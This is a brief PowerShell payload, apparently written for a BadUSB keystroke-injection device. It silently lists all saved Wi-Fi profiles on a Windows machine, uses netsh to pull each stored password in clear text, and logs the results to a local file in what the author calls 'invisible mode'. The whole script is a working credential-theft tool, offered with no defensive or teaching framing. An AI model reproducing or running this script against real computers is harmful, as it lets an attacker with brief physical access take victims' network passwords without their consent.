#wifiscr0.1 for badusb0.1

#invisible mode 
$ErrorActionPreference="SilentlyContinue"
Stop-Transcript | out-null
$ErrorActionPreference = "Continue"
Start-Transcript -path output.log -append

# start wifiscript
$listProfiles = netsh wlan show profiles | Select-String -Pattern "All User Profile" | %{ ($_ -split ":")[-1].Trim() };
$listProfiles | foreach {
	$profileInfo = netsh wlan show profiles name=$_ key="clear";
	$SSID = $profileInfo | Select-String -Pattern "SSID Name" | %{ ($_ -split ":")[-1].Trim() };
	$Key = $profileInfo | Select-String -Pattern "Key Content" | %{ ($_ -split ":")[-1].Trim() };
	[PSCustomObject]@{
		WifiProfileName = $SSID;
		Password = $Key
		
	}
}
Stop-Transcript
#takes around 5 sec to run the script in invisible mode